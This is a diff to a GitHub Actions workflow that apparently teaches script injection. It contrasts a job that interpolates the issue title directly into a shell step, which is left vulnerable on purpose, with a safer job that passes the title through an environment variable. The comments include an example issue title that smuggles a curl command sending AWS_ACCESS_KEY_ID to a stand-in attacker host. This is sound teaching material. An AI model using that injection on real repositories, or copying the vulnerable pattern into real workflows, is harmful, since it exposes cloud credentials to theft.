@@ -8,9 +8,26 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Assign label
+        # code is risky: is open to script injection
+        # e.g. if issue is opend, you can inject any commands in title
+        # a"; echo Got your secrets"
+        # a"; curl http://my-bad-site.com?abc=$AWS_ACCESS_KEY_ID"
         run: |
           issue_title="${{ github.event.issue.title }}"
           if [[ "$issue_title" == *"bug"* ]]; then
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi
+  # non risky option
+  assign-label:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assign label
+        env:
+          TITLE: ${{ github.event.issue.title }}
+        run: |
+          if [[ "$TITLE" == *"bug"* ]]; then
           echo "Issue is about a bug!"
           else
           echo "Issue is not about a bug"
